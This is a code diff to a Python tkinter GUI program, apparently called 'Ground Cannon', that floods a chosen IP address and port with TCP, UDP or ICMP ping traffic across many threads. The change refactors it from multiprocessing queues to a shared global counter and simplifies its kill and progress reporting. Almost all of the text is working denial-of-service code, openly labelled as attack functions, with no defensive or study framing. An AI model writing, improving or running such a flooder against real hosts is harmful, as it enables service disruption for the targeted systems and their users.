@@ -5,20 +5,20 @@ from tkinter import ttk
 import tkinter.font as font
 from tkinter import filedialog as fd
 from tkinter.messagebox import showerror,showinfo
+from tkinter import PhotoImage
 from icmplib import ping
 from random import randbytes 
 import time
-import multiprocessing
 import threading
 import socket
-#from PIL import ImageTk, Image
 import os
-from tkinter import PhotoImage
 
 global loadtype
 loadtype=0
 global filename
 filename=0
+global global_counter
+global_counter=[0,0,0,0,0,0] 
 
 fontset=("Eras Demi ITC", 12)  #
 fontset2=("Eras Demi ITC", 10)
@@ -56,42 +56,38 @@ def loadisfile(): #update later to make a message box to choose file
 
 
 ######################TCP attack function#####################3  
-def tcpatk(port,aload,pktcount,q,ip_):
+def tcpatk(port,aload,pktcount,ip_):
     x=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    global global_counter
+    
     try:
         x.connect((ip_,port))
     except TimeoutError:
         pktcount=0
         print("TCP failed. TimeoutError")
-        
     except ConnectionRefusedError:
         pktcount=0
         print("TCP failed. ConnectionRefusedError")
 
-    print("TCP process started")        
-    while (pktcount>0):
-        repdata=q.get()
+    while pktcount>0 and global_counter[4]>0:
+
         try:
             ss=x.send(aload)
-            print("Sent packet",pktcount)
         except ConnectionResetError:
             pktcount=0
-            #lblatk5['text']="Thread "+repdata[4]+ ": Connection closed."
-            #lblatk5.grid(row=8,column=0)
-            
+            ss=0
         except ConnectionAbortedError:
             pktcount=0
-            #lblatk5['text']="Thread "+repdata[4]+ ": Connection closed."
-            #lblatk5.grid(row=8,column=0)
+            ss=0
 
-        killhit=repdata[4]
-        if killhit<=0:
+        if  global_counter[5]=="k":
             pktcount=0
+            break
         else:
             True
-            
+
         pktcount-=1
-            
+        
         if ss>0 :
             recpkts=1
             lostpkts=0
@@ -99,73 +95,59 @@ def tcpatk(port,aload,pktcount,q,ip_):
             recpkts=0
             lostpkts=1
 
-        repdata[0]+=1   #sent pkts
-        repdata[1]-=1   #left packets
-        repdata[2]+=recpkts #reached packets
-        repdata[3]+=lostpkts #lost packets
-        repdata[4]+=0
-        q.put([repdata[0],repdata[1],repdata[2],repdata[3],repdata[4]])
-        
-                
-    repdata=q.get()
-    repdata[4]-=1 #threads number
-    q.put([repdata[0],repdata[1],repdata[2],repdata[3],repdata[4]])
-    print("TCP process finished")  
+        global_counter[0]+=1   #sent pkts
+        global_counter[1]-=1   #left packets
+        global_counter[2]+=recpkts #reached packets
+        global_counter[3]+=lostpkts #lost packets
+
+    global_counter[4]-=1
     return 0
 
             
 #########################UDP attack function#####################
-def udpatk(port,aload,pktcount,q,ip_):           
+def udpatk(port,aload,pktcount,ip_):           
     x=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    repdata=[0,0,0,0,0]
-    print("UDP process started")  
-    time.sleep(0.1)    
-    while (pktcount>0):
+    global global_counter
+   
+    while pktcount>0 and global_counter[4]>0:
         x.sendto(aload,(ip_,port))
-        print("Sent packet",pktcount)
-        repdata=q.get()
-        killhit=repdata[4]
-        if killhit<=0:
+
+        if  global_counter[5]=="k":
             pktcount=0
+            break
         else:
             True
             
         pktcount-=1            
-        repdata[0]+=1   #sent pkts
-        repdata[1]-=1   #left packets
-        q.put([repdata[0],repdata[1],repdata[2],repdata[3],repdata[4]])
+        global_counter[0]+=1   #sent pkts
+        global_counter[1]-=1   #left packets
 
+        global_counter[0]+=1   #sent pkts
+        global_counter[1]-=1   #left packets
 
-    #communicate through queue 
-    repdata=q.get()
-    repdata[4]-=1 #threads number
-    q.put([repdata[0],repdata[1],repdata[2],repdata[3],repdata[4]])
-    print("UDP process finished")
+    global_counter[4]-=1
     return 0
 
       
 
 ###############################PING attack function#############
-def pingatk(aload,itrvln,pktcount,q,ip_):
+def pingatk(aload,itrvln,pktcount,ip_):
     lostpkts=0
     senpkts=0
-    repdata=[0,0,0,0,0]
-    print("Ping process started")
-    time.sleep(0.1)
-    while(pktcount>0):
-        repdata=q.get()
-        killhit=repdata[4]
-        if killhit<=0:
+    global global_counter
+    while pktcount>0 and global_counter[4]>0:
+
+        if global_counter[5]=="k":
             pktcount=0
+            break
         else:
-            True #pass
-            
+            pass
+
         try:
             x=ping(ip_,count=1,interval=itrvln, payload=aload,timeout=1)
-            print("Sent packet",pktcount)
         except:
             print("couldnt ping. Check internet connection")
-            pktcount=0
+        
         pktcount-=1
         recpkts=x.packets_received
         if recpkts>0 :
@@ -175,28 +157,23 @@ def pingatk(aload,itrvln,pktcount,q,ip_):
             recpkts=0
             lostpkts=1            
 
-        repdata[0]+=1   #sent pkts
-        repdata[1]-=1   #left packets
-        repdata[2]+=recpkts #reached packets
-        repdata[3]+=lostpkts #lost packets
-        repdata[4]+=0
-        q.put([repdata[0],repdata[1],repdata[2],repdata[3],repdata[4]])
-        
-        
-    #communicate through queue 
-    repdata=q.get()
-    repdata[4]-=1 #threads number
-    q.put([repdata[0],repdata[1],repdata[2],repdata[3],repdata[4]])
-    print("Ping process finished")
+        global_counter[0]+=1   #sent pkts
+        global_counter[1]-=1   #left packets
+        global_counter[2]+=recpkts #reached packets
+        global_counter[3]+=lostpkts #lost packets        
+
+    global_counter[4]-=1    
     return 0
 
 
-#######################Main attack function#########################
-####################Set report info, start progress bar, get needed info
-#Prepare load, pick attack type, create threads for attack
-###make a thread for attack-thread-creation
-#################and another one for progress bar
-def goatkt2(filepath,prgrsbar,loadtype,loadsize,treadsno,ip_,pcount_,textboxload,atktype,intervaln_,portnum,q,repdata):
+####################### Main attack function #########################
+#################### Set report info, start progress bar, get needed info
+#   Prepare load, pick attack type, create threads for attack
+### make a thread for attack-thread-creation
+### and another one for progress bar
+
+def goatkt2(lblatk5,filepath,prgrsbar,loadtype,loadsize,treadsno,ip_,
+    pcount_,textboxload,atktype,intervaln_,portnum):
     #check input
     if type(loadsize)!=int and loadtype==1  :
         lblatk5['text']="-Fix loadsize -"
@@ -223,7 +200,7 @@ def goatkt2(filepath,prgrsbar,loadtype,loadsize,treadsno,ip_,pcount_,textboxload
         pcount_=0
 
     else:
-        True
+        pass
 
     if loadtype==1:          #determine type of load
         aload=randbytes(loadsize)
@@ -252,16 +229,16 @@ def goatkt2(filepath,prgrsbar,loadtype,loadsize,treadsno,ip_,pcount_,textboxload
         treadsno=0
         print("something is wrong. Cant start")
     else:
-        #prepare data for queue
-        repdata[4]=treadsno #threads for progressbar
-        repdata[3]=0
-        repdata[2]=0
-        repdata[1]=treadsno*pcount_    #total packets
-        repdata[0]=0
-        q.put([0,repdata[1],0,0,threadsn.get()])
+        #prepare global_counter
+        global_counter[5]=0 #not kill!
+        global_counter[4]=treadsno #number of threads
+        global_counter[3]=0 #packets lost
+        global_counter[2]=0 #packets reached
+        global_counter[1]=treadsno*pcount_    #total packets
+        global_counter[0]=0 #packets sent
 
 
-    finalthread=threading.Thread(target=create_procs,args=(aload,intervaln_,pcount_,q,ip_,atktype,treadsno,portnum))
+    finalthread=threading.Thread(target=create_procs,args=(aload,intervaln_,pcount_,ip_,atktype,treadsno,portnum))
     finalthread.start()
     print("Creating threads...") 
 
@@ -269,17 +246,18 @@ def goatkt2(filepath,prgrsbar,loadtype,loadsize,treadsno,ip_,pcount_,textboxload
         lblatk5['text']="- Attacking -"
         lblatk5.grid(row=8,column=0)        
         prgrsbar.start()      
-        prgt=threading.Thread(target=progbar, args=(q,))
+        prgt=threading.Thread(target=progbar,args=(prgrsbar,))
         prgt.start()
         print("attacking!")
     else:
         False
         
-def create_procs(aload,intervaln_,pcount_,q,ip_,atktype,treadsno,portnum):
+################# Start creating threads
+def create_procs(aload,intervaln_,pcount_,ip_,atktype,treadsno,portnum):
     if atktype=="PING" :             #determine atk type
         while(treadsno>0): #ping threads
-            tread1=multiprocessing.Process(target=pingatk, args=(aload,
-            intervaln_,pcount_,q,ip_))
+            tread1=threading.Thread(target=pingatk, args=(aload,
+            intervaln_,pcount_,ip_))
             tread1.start()
             lblatk5['text']="Created Process "+str(treadsno)
             lblatk5.grid(row=8,column=0)
@@ -288,7 +266,7 @@ def create_procs(aload,intervaln_,pcount_,q,ip_,atktype,treadsno,portnum):
 
     elif atktype=="TCP" :
          while(treadsno>0): #tcp threads
-             tread1=multiprocessing.Process(target=tcpatk, args=(portnum,aload,pcount_,q,ip_))
+             tread1=threading.Thread(target=tcpatk, args=(portnum,aload,pcount_,ip_))
              tread1.start()
              lblatk5['text']="Created Process "+str(treadsno)
              lblatk5.grid(row=8,column=0)   
@@ -299,7 +277,7 @@ def create_procs(aload,intervaln_,pcount_,q,ip_,atktype,treadsno,portnum):
         lblatkx3.grid(row=11,column=0)
         lblatkx4.grid(row=12,column=0)  
         while(treadsno>0): #udp threads
-            tread1=multiprocessing.Process(target=udpatk, args=(portnum,aload,pcount_,q,ip_))
+            tread1=threading.Thread(target=udpatk, args=(portnum,aload,pcount_,ip_))
             tread1.start()
             lblatk5['text']="Created Process "+str(treadsno)
             lblatk5.grid(row=8,column=0)   
@@ -309,77 +287,53 @@ def create_procs(aload,intervaln_,pcount_,q,ip_,atktype,treadsno,portnum):
         lblatk5['text']="- Attacking -"
         lblatk5.grid(row=8,column=0)  
     else:
-        True#print("here goes nothing!", repdata[4])
+        True
 
 
 
 #########For stopping progress bar when it finishes##############
 ###########################and for updating report##############
-def progbar(q):
-    repdata=[0,threadsn.get()*pcount.get(),0,0,threadsn.get()]
-    while(repdata[4]>0):       
-        repdata=q.get()
-        lblatkx1['text']=repdata[0]
-        lblatkx2['text']=repdata[1]
-        lblatkx3['text']=repdata[2]
-        lblatkx4['text']=repdata[3]
+def progbar(prgrsbar):
+    global global_counter
+    while global_counter[4]>0:
+        lblatkx1['text']=global_counter[0]
+        lblatkx2['text']=global_counter[1]
+        lblatkx3['text']=global_counter[2]
+        lblatkx4['text']=global_counter[3]
         lblatkx4.grid(row=12,column=0)
         lblatkx3.grid(row=11,column=0)      
         lblatkx2.grid(row=10,column=0)
         lblatkx1.grid(row=9,column=0)
-        q.put([repdata[0],repdata[1],repdata[2],repdata[3],repdata[4]])        
+        time.sleep(1)
 
-        
     prgrsbar.stop()
     lblatkx4.grid(row=12,column=0)
     lblatkx3.grid(row=11,column=0)      
     lblatkx2.grid(row=10,column=0)
     lblatkx1.grid(row=9,column=0)
-    q.get() #empty queue
-    if lblatk5['text']=="Connection closed." :
-        lblatk5.grid(row=8,column=0)
-        print("Connection closed.")
-        showinfo(title="!",message="Connection closed.")
-           
-    elif lblatk5['text']=="Host is down/failed to Connect" :
-        lblatk5.grid(row=8,column=0)
-        print("Host is down/Failed to connect")
-        showinfo(title="!",message="Host is down/Failed to connect.")
               
-    else:
+
+    if global_counter[1]!=0 and global_counter[5]!="k":
+        showinfo(title="Attack stopped",
+        message="It didnt finish sending all packets. Target might be down or Connection was closed.\nRun Ground Cannon from cmd and try again if you think there is an error.")
+    elif global_counter[1]==0 and global_counter[5]!="k":
         lblatk5['text']="- Attack Stopped -"
         lblatk5.grid(row=8,column=0)
-        print("Attack stopped")
-        if repdata[1]!=0:
-            showinfo(title="Attack stopped",
-            message="It didnt finish sending all packets. Target might be down or Connection was closed.\nRun Ground Cannon from cmd and try again if you think there is an error.")
-        else:
-            1==1#showinfo(title="Done!",message="Host is down/Failed to connect.")
-          
-        
+    else:
+        lblatk5['text']="- Attack Canceled -"
+        lblatk5.grid(row=8,column=0)        
+
+    print("Attack stopped")
 
 ###########################Cancel attack
-def killatk(q):
-    repdata=[0,0,0,0,0]
-    try:
-        repdata=q.get()
-    except:
-        print("couldnt get queue")
-    repdata[4]=0
-    q.put([repdata[0],repdata[1],repdata[2],repdata[3],repdata[4]])
-    lblatk5['text']="- Attack was canceled -"
-    lblatk5.grid(row=8,column=0)
-
-
-def killatk2(q):
-    t_read=threading.Thread(target=killatk, args=(q,))
-    t_read.start()
-    #print("should kill now")
+def killatk():
+    global global_counter
+    global_counter[4]=0
+    global_counter[5]="k"
 
 ###################second set of attack report labels
 
 if __name__ == "__main__":
-    multiprocessing.freeze_support()  
     root=tk.Tk()
     root.geometry('603x435+50+50')
     root.resizable(False, False)
@@ -516,28 +470,22 @@ if __name__ == "__main__":
     prgrsbar=ttk.Progressbar(root,orient="horizontal", length=250, mode='indeterminate')
     prgrsbar.grid(row=13, column=0,sticky=tk.S+tk.W, pady=0, columnspan=3)
 
-    q=multiprocessing.Queue()
-    repdata=[0,0,0,0,0]
     #lblatkx1-4, threads left
     
 
     #Go! button
     btngo=tk.Button(root,width=7, height=2,font=btnfont, bg="Green", foreground="white", text="Go!",
-    command=lambda: goatkt2(filename,prgrsbar,loadtype, loadsize.get(),
+    command=lambda: goatkt2(lblatk5,filename,prgrsbar,loadtype, loadsize.get(),
     threadsn.get(),ip.get(),pcount.get(),textbox2.get('1.0','end'),
-    checkbox_var2.get(),intervaln.get(),portnum.get(),q,repdata))
+    checkbox_var2.get(),intervaln.get(),portnum.get()))
     #loadtype, ldsize,       treads          ,tstlbl, mxlbl,ip_     pcount_  #textboxload                 #atktype             #intervaln_
     btngo.grid(row=5, column=2, padx=0,pady=3)
 
-    #Info button
-    #btninfo=tk.Button(root,width=3,height=1,font=btnfont,command=lambda: showinfo(title="Info",
-    #message="If attack stops before finishing all packets then connection was closed by target or target is down"))
-    
 
     #Kill button
-    btngo=tk.Button(root,font=btnfont, width=8, height=2, text="Kill",bg="red", foreground="white",
-    command=lambda: killatk2(q))
-    btngo.grid(row=5, column=3, pady=3,sticky=tk.E, padx=0)
+    killbtn=tk.Button(root,font=btnfont, width=8, height=2, text="Kill",bg="red", foreground="white",
+    command=killatk)
+    killbtn.grid(row=5, column=3, pady=3,sticky=tk.E, padx=0)
 
     frame1=tk.Canvas(root,width=250,height=200,border=-2,bg="black")
     frame1.grid(row=6,column=2,rowspan=13,columnspan=4,padx=0)
